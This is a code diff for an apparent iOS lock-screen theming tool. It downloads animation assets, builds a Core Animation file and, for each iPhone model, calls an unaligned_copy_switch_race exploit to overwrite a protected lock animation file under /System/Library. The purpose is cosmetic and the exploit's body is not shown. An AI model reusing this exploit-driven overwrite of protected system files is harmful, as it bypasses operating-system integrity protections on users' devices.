@@ -17,6 +17,8 @@
 #include <fcntl.h>
 #include <sys/mman.h>
 
+#import <ZipArchive.h>
+
 #define T_QUIET
 #define T_EXPECT_MACH_SUCCESS(a, b)
 #define T_EXPECT_MACH_ERROR(a, b, c)
@@ -348,47 +350,1075 @@ T_DECL(unaligned_copy_switch_race,
     T_PASS("Ran %d times in %ld seconds with no failure", loops, duration);
 }
 
-void poc812(void) {
-    NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
-    NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
-    const char *model_path = dirName.UTF8String;
-    g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
-    g_arg_overwrite_file_path = model_path;
-    unaligned_copy_switch_race();
-}
+void overwriteLock(NSString *model, BOOL *media, NSString *url) {
+    if (media == true) {
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+            NSLog(@"downloading a fresh copy of custom zip file");
+            NSString *urlToDownload = url;
+            NSURL  *url = [NSURL URLWithString:urlToDownload];
+            NSData *urlData = [NSData dataWithContentsOfURL:url];
+            if ( urlData )
+            {
+                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+                NSString  *documentsDirectory = [paths objectAtIndex:0];
+                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"TrollLock.zip"];
+                
+                dispatch_async(dispatch_get_main_queue(), ^{
+                    [urlData writeToFile:filePath atomically:YES];
+                    [SSZipArchive unzipFileAtPath:filePath toDestination:documentsDirectory];
+                    NSLog(@"yay! success");
+                });
+            }
+            
+        });
+        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+        NSString *documentsDirectory = [paths objectAtIndex:0];
+        NSString *troll1 = [documentsDirectory stringByAppendingPathComponent:@"trollformation1.png"];
+        NSString *troll2 = [documentsDirectory stringByAppendingPathComponent:@"trollformation2.png"];
+        NSString *troll3 = [documentsDirectory stringByAppendingPathComponent:@"trollformation3.png"];
+        NSString *troll4 = [documentsDirectory stringByAppendingPathComponent:@"trollformation4.png"];
+        NSString *troll5 = [documentsDirectory stringByAppendingPathComponent:@"trollformation5.png"];
+        NSString *troll6 = [documentsDirectory stringByAppendingPathComponent:@"trollformation6.png"];
+        NSString *troll7 = [documentsDirectory stringByAppendingPathComponent:@"trollformation7.png"];
+        NSString *troll8 = [documentsDirectory stringByAppendingPathComponent:@"trollformation8.png"];
+        NSString *troll9 = [documentsDirectory stringByAppendingPathComponent:@"trollformation9.png"];
+        NSString *troll10 = [documentsDirectory stringByAppendingPathComponent:@"trollformation10.png"];
+        NSString *troll11 = [documentsDirectory stringByAppendingPathComponent:@"trollformation11.png"];
+        NSString *troll12 = [documentsDirectory stringByAppendingPathComponent:@"trollformation12.png"];
+        NSString *troll13 = [documentsDirectory stringByAppendingPathComponent:@"trollformation13.png"];
+        NSString *troll14 = [documentsDirectory stringByAppendingPathComponent:@"trollformation14.png"];
+        NSString *troll15 = [documentsDirectory stringByAppendingPathComponent:@"trollformation15.png"];
+        NSString *troll16 = [documentsDirectory stringByAppendingPathComponent:@"trollformation16.png"];
+        NSString *troll17 = [documentsDirectory stringByAppendingPathComponent:@"trollformation17.png"];
+        NSString *troll18 = [documentsDirectory stringByAppendingPathComponent:@"trollformation18.png"];
+        NSString *troll19 = [documentsDirectory stringByAppendingPathComponent:@"trollformation19.png"];
+        NSString *troll20 = [documentsDirectory stringByAppendingPathComponent:@"trollformation20.png"];
+        NSString *troll21 = [documentsDirectory stringByAppendingPathComponent:@"trollformation21.png"];
+        NSString *troll22 = [documentsDirectory stringByAppendingPathComponent:@"trollformation22.png"];
+        NSString *troll23 = [documentsDirectory stringByAppendingPathComponent:@"trollformation23.png"];
+        NSString *troll24 = [documentsDirectory stringByAppendingPathComponent:@"trollformation24.png"];
+        NSString *troll25 = [documentsDirectory stringByAppendingPathComponent:@"trollformation25.png"];
+        NSString *troll26 = [documentsDirectory stringByAppendingPathComponent:@"trollformation26.png"];
+        NSString *troll27 = [documentsDirectory stringByAppendingPathComponent:@"trollformation27.png"];
+        NSString *troll28 = [documentsDirectory stringByAppendingPathComponent:@"trollformation28.png"];
+        NSString *troll29 = [documentsDirectory stringByAppendingPathComponent:@"trollformation29.png"];
+        NSString *troll30 = [documentsDirectory stringByAppendingPathComponent:@"trollformation30.png"];
+        NSString *troll31 = [documentsDirectory stringByAppendingPathComponent:@"trollformation31.png"];
+        NSString *troll32 = [documentsDirectory stringByAppendingPathComponent:@"trollformation32.png"];
+        NSString *troll33 = [documentsDirectory stringByAppendingPathComponent:@"trollformation33.png"];
+        NSString *troll34 = [documentsDirectory stringByAppendingPathComponent:@"trollformation34.png"];
+        NSString *troll35 = [documentsDirectory stringByAppendingPathComponent:@"trollformation35.png"];
+        NSString *troll36 = [documentsDirectory stringByAppendingPathComponent:@"trollformation36.png"];
+        NSString *trolley = [documentsDirectory stringByAppendingPathComponent:@"trollformation37.png"];
+        NSString *troll38 = [documentsDirectory stringByAppendingPathComponent:@"trollformation38.png"];
+        NSString *troll39 = [documentsDirectory stringByAppendingPathComponent:@"trollformation39.png"];
+        NSString *troll40 = [documentsDirectory stringByAppendingPathComponent:@"trollformation40.png"];
+        NSString *fileContents = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
+<caml xmlns=\"http://www.apple.com/CoreAnimation/1.0\">\
+  <CALayer allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 69.0 100.0\" contentsFormat=\"RGBA8\" name=\"root\" position=\"34.5 50.0\">\
+    <sublayers>\
+      <CALayer id=\"#3\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" geometryFlipped=\"1\" name=\"container\" position=\"34.5 50.0\">\
+          <sublayers>\
+            <CALayer id=\"#2\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" name=\"shake\" position=\"73.5 66.0\">\
+              <sublayers>\
+                <CALayer id=\"#1\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" name=\"shackle\" opacity=\"1\" position=\"73.5 66.0\">\
+                  <contents type=\"CGImage\" src=\"troll1\"/>\
+                </CALayer>\
+              </sublayers>\
+            </CALayer>\
+          </sublayers>\
+        </CALayer>\
+      </sublayers>\
+    <states>\
+      <LKState name=\"Sleep\">\
+    <elements>\
+      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"transform.scale.xy\">\
+        <value type=\"real\" value=\"0.75\"/>\
+      </LKStateSetValue>\
+      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"opacity\">\
+        <value type=\"integer\" value=\"0\"/>\
+      </LKStateSetValue>\
+    </elements>\
+      </LKState>\
+      <LKState name=\"Locked\"/>\
+      <LKState name=\"Unlocked\">\
+    <elements>\
+      <LKStateSetValue final=\"false\" targetId=\"#1\" keyPath=\"contents\">\
+        <value type=\"CGImage\" src=\"trolla40\"/>\
+      </LKStateSetValue>\
+    </elements>\
+      </LKState>\
+      <LKState name=\"Error\">\
+    <elements>\
+      <LKStateSetValue final=\"false\" targetId=\"#2\" keyPath=\"position.x\">\
+        <value type=\"real\" value=\"113.5\"/>\
+      </LKStateSetValue>\
+      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"position.x\">\
+        <value type=\"real\" value=\"-5.5\"/>\
+      </LKStateSetValue>\
+    </elements>\
+      </LKState>\
+    </states>\
+    <stateTransitions>\
+      <LKStateTransition fromState=\"*\" toState=\"Unlocked\">\
+    <elements>\
+      <LKStateTransitionElement final=\"false\" key=\"contents\" targetId=\"#1\">\
+        <animation type=\"CAKeyframeAnimation\" calculationMode=\"discrete\" keyPath=\"contents\" duration=\"1\" fillMode=\"backwards\" timingFunction=\"linear\">\
+          <keyTimes>\
+                <real value=\"0\"/>\
+                <real value=\"0.01666666666\"/>\
+                <real value=\"0.03333333333\"/>\
+                <real value=\"0.05\"/>\
+                <real value=\"0.06666666666\"/>\
+                <real value=\"0.08333333333\"/>\
+                <real value=\"0.1\"/>\
+                <real value=\"0.116666666667\"/>\
+                <real value=\"0.133333333333\"/>\
+                <real value=\"0.15\"/>\
+                <real value=\"0.166666666667\"/>\
+                <real value=\"0.183333333333\"/>\
+                <real value=\"0.2\"/>\
+                <real value=\"0.216666666667\"/>\
+                <real value=\"0.233333333333\"/>\
+                <real value=\"0.25\"/>\
+                <real value=\"0.266666666667\"/>\
+                <real value=\"0.283333333333\"/>\
+                <real value=\"0.3\"/>\
+                <real value=\"0.316666666667\"/>\
+                <real value=\"0.333333333333\"/>\
+                <real value=\"0.35\"/>\
+                <real value=\"0.366666666667\"/>\
+                <real value=\"0.383333333333\"/>\
+                <real value=\"0.4\"/>\
+                <real value=\"0.416666666667\"/>\
+                <real value=\"0.433333333333\"/>\
+                <real value=\"0.45\"/>\
+                <real value=\"0.466666666667\"/>\
+                <real value=\"0.483333333333\"/>\
+                <real value=\"0.5\"/>\
+                <real value=\"0.516666666667\"/>\
+                <real value=\"0.533333333333\"/>\
+                <real value=\"0.55\"/>\
+                <real value=\"0.566666666667\"/>\
+                <real value=\"0.583333333333\"/>\
+                <real value=\"0.6\"/>\
+                <real value=\"0.616666666667\"/>\
+                <real value=\"0.633333333333\"/>\
+                <real value=\"0.65\"/>\
+                <real value=\"0.666666666667\"/>\
+                <real value=\"0.683333333333\"/>\
+                <real value=\"0.7\"/>\
+                <real value=\"0.716666666667\"/>\
+                <real value=\"0.733333333333\"/>\
+                <real value=\"0.75\"/>\
+                <real value=\"0.766666666667\"/>\
+                <real value=\"0.783333333333\"/>\
+                <real value=\"0.8\"/>\
+                <real value=\"0.816666666667\"/>\
+                <real value=\"0.833333333333\"/>\
+                <real value=\"0.85\"/>\
+                <real value=\"0.866666666667\"/>\
+                <real value=\"0.883333333333\"/>\
+                <real value=\"0.9\"/>\
+          </keyTimes>\
+          <values>\
+                <CGImage src=\"troll1\"/>\
+                <CGImage src=\"troll2\"/>\
+                <CGImage src=\"troll3\"/>\
+                <CGImage src=\"troll4\"/>\
+                <CGImage src=\"troll5\"/>\
+                <CGImage src=\"troll6\"/>\
+                <CGImage src=\"troll7\"/>\
+                <CGImage src=\"troll8\"/>\
+                <CGImage src=\"troll9\"/>\
+                <CGImage src=\"trolling10\"/>\
+                <CGImage src=\"trolling11\"/>\
+                <CGImage src=\"trolling12\"/>\
+                <CGImage src=\"trolling13\"/>\
+                <CGImage src=\"trolling14\"/>\
+                <CGImage src=\"trolling15\"/>\
+                <CGImage src=\"trolling16\"/>\
+                <CGImage src=\"trolling17\"/>\
+                <CGImage src=\"trolling18\"/>\
+                <CGImage src=\"trolling19\"/>\
+                <CGImage src=\"trolley20\"/>\
+                <CGImage src=\"trolley21\"/>\
+                <CGImage src=\"trolley22\"/>\
+                <CGImage src=\"trolley23\"/>\
+                <CGImage src=\"trolley24\"/>\
+                <CGImage src=\"trolley25\"/>\
+                <CGImage src=\"trolley26\"/>\
+                <CGImage src=\"trolley27\"/>\
+                <CGImage src=\"trolley28\"/>\
+                <CGImage src=\"trolley29\"/>\
+                <CGImage src=\"trolla30\"/>\
+                <CGImage src=\"trolla31\"/>\
+                <CGImage src=\"trolla32\"/>\
+                <CGImage src=\"trolla33\"/>\
+                <CGImage src=\"trolla34\"/>\
+                <CGImage src=\"trolla35\"/>\
+                <CGImage src=\"trolla36\"/>\
+                <CGImage src=\"trolla37\"/>\
+                <CGImage src=\"trolla38\"/>\
+                <CGImage src=\"trolla39\"/>\
+                <CGImage src=\"trolla40\"/>\
+          </values>\
+        </animation>\
+      </LKStateTransitionElement>\
+    </elements>\
+      </LKStateTransition>\
+      <LKStateTransition fromState=\"Unlocked\" toState=\"*\">\
+    <elements/>\
+      </LKStateTransition>\
+      <LKStateTransition fromState=\"*\" toState=\"Sleep\">\
+    <elements>\
+      <LKStateTransitionElement final=\"false\" key=\"transform.scale.xy\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"transform.scale.xy\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+      <LKStateTransitionElement final=\"false\" key=\"opacity\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"opacity\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+    </elements>\
+      </LKStateTransition>\
+      <LKStateTransition fromState=\"Sleep\" toState=\"*\">\
+    <elements>\
+      <LKStateTransitionElement final=\"false\" key=\"transform.scale.xy\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"transform.scale.xy\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+      <LKStateTransitionElement final=\"false\" key=\"opacity\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"opacity\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+    </elements>\
+      </LKStateTransition>\
+      <LKStateTransition fromState=\"*\" toState=\"Error\">\
+    <elements>\
+      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.2\" fillMode=\"both\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#2\">\
+        <animation type=\"CASpringAnimation\" damping=\"40\" mass=\"3\" stiffness=\"2200\" keyPath=\"position.x\" beginTime=\"0.075\" duration=\"0.78\" fillMode=\"both\" speed=\"1.4\"/>\
+      </LKStateTransitionElement>\
+    </elements>\
+      </LKStateTransition>\
+      <LKStateTransition fromState=\"Error\" toState=\"*\">\
+    <elements>\
+      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#2\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+    </elements>\
+      </LKStateTransition>\
+    </stateTransitions>\
+  </CALayer>\
+</caml>\
+";
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll1"
+                                                               withString:troll1];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll2"
+                                                               withString:troll2];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll3"
+                                                               withString:troll3];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll4"
+                                                               withString:troll4];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll5"
+                                                               withString:troll5];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll6"
+                                                               withString:troll6];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll7"
+                                                               withString:troll7];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll8"
+                                                               withString:troll8];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll9"
+                                                               withString:troll9];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling10"
+                                                               withString:troll10];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling11"
+                                                               withString:troll11];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling12"
+                                                               withString:troll12];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling13"
+                                                               withString:troll13];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling14"
+                                                               withString:troll14];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling15"
+                                                               withString:troll15];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling16"
+                                                               withString:troll16];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling17"
+                                                               withString:troll17];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling18"
+                                                               withString:troll18];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling19"
+                                                               withString:troll19];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley20"
+                                                               withString:troll20];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley21"
+                                                               withString:troll21];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley22"
+                                                               withString:troll22];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley23"
+                                                               withString:troll23];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley24"
+                                                               withString:troll24];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley25"
+                                                               withString:troll25];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley26"
+                                                               withString:troll26];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley27"
+                                                               withString:troll27];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley28"
+                                                               withString:troll28];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley29"
+                                                               withString:troll29];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla30"
+                                                               withString:troll30];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla31"
+                                                               withString:troll31];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla32"
+                                                               withString:troll32];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla33"
+                                                               withString:troll33];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla34"
+                                                               withString:troll34];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla35"
+                                                               withString:troll35];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla36"
+                                                               withString:troll36];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla37"
+                                                               withString:trolley];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla38"
+                                                               withString:troll38];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla39"
+                                                               withString:troll39];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla40"
+                                                               withString:troll40];
+        
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+            NSLog(@"downloading a fresh copy of main.caml");
+            NSString *urlToDownload = @"https://raw.githubusercontent.com/haxi0/TrollLock-Reborn/main/assets/main.caml";
+            NSURL  *url = [NSURL URLWithString:urlToDownload];
+            NSData *urlData = [NSData dataWithContentsOfURL:url];
+            if ( urlData )
+            {
+                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+                NSString  *documentsDirectory = [paths objectAtIndex:0];
+                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"main.caml"];
+                
+                dispatch_async(dispatch_get_main_queue(), ^{
+                    [urlData writeToFile:filePath atomically:YES];
+                    [fileContents writeToFile:filePath atomically:YES];
+                    NSLog(@"yay! success");
+                });
+            }
+            
+        });
+        
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+            if ([model isEqual:@"iPhone14,7"]) { // iPhone 14
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone13,2"]) { // iPhone 12
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone13,3"]) { // iPhone 12 Pro
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone13,4"]) { // iPhone 12 Pro Max
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone13,1"]) { // iPhone 12 Mini
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone14,3"]) { // iPhone 13 Pro Max
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone14,2"]) { // iPhone 13 Pro
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone14,5"]) { // iPhone 13
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone14,4"]) { // iPhone 13 Mini
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone10,3"]) { // iPhone X (Global)
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone10,6"]) { // iPhone X (GSM)
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone15,2"]) { // iPhone 14 Pro
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-d73.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone15,3"]) { // iPhone 14 Pro Max
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-d73.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone11,2"]) { // iPhone XS
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone11,6"]) { // iPhone XS Max
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone11,4"]) { // iPhone XS Max (China)
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone12,1"]) { // iPhone 11
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone12,3"]) { // iPhone 11 Pro
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone12,5"]) { // iPhone 11 Pro Max
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone11,8"]) { // iPhone XR
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
